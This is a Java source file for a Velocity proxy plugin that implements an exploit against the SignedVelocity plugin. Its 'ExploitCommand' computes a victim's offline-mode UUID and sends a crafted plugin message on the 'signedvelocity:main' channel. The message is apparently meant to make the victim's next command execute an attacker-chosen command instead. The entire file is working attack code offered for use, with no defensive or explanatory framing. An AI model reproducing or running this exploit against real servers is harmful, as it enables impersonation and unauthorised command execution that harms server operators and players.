package dev.wrrulos.signedvelocityexploit.commands;

import com.velocitypowered.api.command.CommandSource;
import com.velocitypowered.api.command.SimpleCommand;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.messages.MinecraftChannelIdentifier;
import dev.wrrulos.signedvelocityexploit.Signedvelocityexploit;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

import java.util.UUID;

public class ExploitCommand implements SimpleCommand {
    public static final MinecraftChannelIdentifier IDENTIFIER = MinecraftChannelIdentifier.from("signedvelocity:main");

    @Override
    public void execute(Invocation invocation) {
        CommandSource source = invocation.source();
        String[] args = invocation.arguments();

        // Check if the source is a player
        if (!(source instanceof Player player)) {
            Component message = Component.text(Signedvelocityexploit.PREFIX + "This command can only be executed by a player.", NamedTextColor.RED);
            source.sendMessage(message);
            return;
        }

        if (args.length == 0) {
            player.sendMessage(Component.text(Signedvelocityexploit.PREFIX + "Not enough arguments.", NamedTextColor.RED));
            return;
        }

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(b);

        try {
            // Generate UUID from the player name in offline mode
            String uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + args[0]).getBytes(StandardCharsets.UTF_8)).toString();
            out.writeUTF(uuid);
            out.writeUTF("COMMAND_RESULT");
            out.writeUTF("MODIFY");

            // Concatenate the arguments into a single string, starting from the second argument
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i < args.length; i++) {
                stringBuilder.append(args[i]).append(" ");
            }

            out.writeUTF(stringBuilder.toString().trim());

            // Send the payload to the server
            player.getCurrentServer().ifPresent(server -> {
                server.sendPluginMessage(IDENTIFIER, b.toByteArray());
            });
        } catch (IOException e) {
            Component message = Component.text(Signedvelocityexploit.PREFIX + "An error occurred while sending the payload", NamedTextColor.RED);
            player.sendMessage(message);
            System.err.println("An error occurred while sending the payload: " + e.getMessage());
            return;
        }

        player.sendMessage(Component.text(Signedvelocityexploit.PREFIX + "Command spoof payload sent, awaiting target to execute any command", NamedTextColor.GREEN));
    }
}
